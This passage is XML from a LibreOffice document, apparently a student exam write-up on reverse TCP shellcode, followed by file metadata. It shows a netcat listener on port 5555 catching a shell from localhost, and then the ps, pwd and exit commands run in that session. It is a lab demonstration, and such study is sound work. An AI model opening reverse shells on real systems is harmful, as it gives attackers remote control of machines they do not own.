      <text:p text:style-name="P58">nc: listening on :: 5555 ... </text:p>
      <text:p text:style-name="P58">nc: listening on 0.0.0.0 5555 ... </text:p>
      <text:p text:style-name="P58">nc: connect to 127.0.0.1 5555 from localhost (127.0.0.1) 34134 [34134] </text:p>
      <text:p text:style-name="P58">ps </text:p>
      <text:p text:style-name="P58"><text:s text:c="2"/>PID TTY <text:s text:c="9"/>TIME CMD </text:p>
      <text:p text:style-name="P58"><text:s/>5503 pts/2 <text:s text:c="3"/>00:00:00 bash </text:p>
      <text:p text:style-name="P58"><text:s/>6030 pts/2 <text:s text:c="3"/>00:00:00 sh </text:p>
      <text:p text:style-name="P58"><text:s/>6031 pts/2 <text:s text:c="3"/>00:00:00 ps </text:p>
      <text:p text:style-name="P58">pwd </text:p>
      <text:p text:style-name="P58">/root/Desktop/Exam/Assignment5/Reverse_TCP </text:p>
      <text:p text:style-name="P58">exiit </text:p>
      <text:p text:style-name="P58">/bin/sh: 3: exiit: not found </text:p>
      <text:p text:style-name="P58">exit </text:p>
      <text:p text:style-name="P5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ejaVu Sans Mono" fo:font-size="10pt" style:font-name-asian="Droid Sans Fallback1" style:font-size-asian="10pt" style:font-name-complex="FreeSans2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23T17:00:05.552434317</meta:creation-date>
    <dc:date>2014-07-27T10:04:48.866021636</dc:date>
    <meta:editing-duration>PT2H9M54S</meta:editing-duration>
    <meta:editing-cycles>13</meta:editing-cycles>
    <meta:generator>LibreOffice/4.1.0.4$Linux_X86_64 LibreOffice_project/410m0$Build-4</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="7" meta:paragraph-count="269" meta:word-count="1261" meta:character-count="10886" meta:non-whitespace-character-count="7314"/>
  </office:meta>
</office:document-meta>
</file>